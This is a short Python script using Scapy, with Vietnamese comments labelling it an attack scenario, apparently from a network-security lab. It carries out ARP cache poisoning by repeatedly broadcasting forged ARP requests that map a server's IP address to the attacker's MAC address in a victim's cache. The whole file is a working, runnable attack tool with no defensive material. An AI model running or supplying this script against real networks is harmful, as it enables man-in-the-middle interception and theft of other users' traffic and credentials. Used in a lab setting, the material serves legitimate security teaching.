#!/usr/bin/env python3
"""
Kịch bản 2: Tấn công ARP Cache Poisoning bằng gói tin ARP Request (Broadcast hoặc Unicast)
Attacker gửi gói ARP Request giả mạo hỏi User, nhưng khai báo IP nguồn là Server và MAC nguồn là Attacker.
Khi User nhận gói ARP Request, User sẽ tự động cập nhật ánh xạ IP Server -> MAC Attacker vào ARP cache.
"""
from scapy.all import *
import time

IP_VICTIM = "10.2.6.10"       # User
IP_SPOOFED = "10.2.6.20"      # Server
MAC_ATTACKER = get_if_hwaddr("eth0")

print(f"[*] Attacker MAC : {MAC_ATTACKER}")
print(f"[*] Target Victim: {IP_VICTIM}")
print(f"[*] Spoofing     : {IP_SPOOFED} -> MAC {MAC_ATTACKER}")
print("[*] Gui ARP Request den nan nhan... (Nhan Ctrl+C de dung)")

# Tao goi ARP Request (op=1)
# hwsrc: MAC Attacker, psrc: IP Server, pdst: IP User
pkt = Ether(src=MAC_ATTACKER, dst="ff:ff:ff:ff:ff:ff")/ARP(
    hwsrc=MAC_ATTACKER,
    psrc=IP_SPOOFED,
    pdst=IP_VICTIM,
    op=1
)

try:
    while True:
        sendp(pkt, iface="eth0", verbose=0)
        print(f"[+] [Kich ban 2] Sent ARP Request: Who has {IP_VICTIM}? Tell {IP_SPOOFED} ({MAC_ATTACKER})")
        time.sleep(2)
except KeyboardInterrupt:
    print("\n[*] Da dung kich ban 2.")
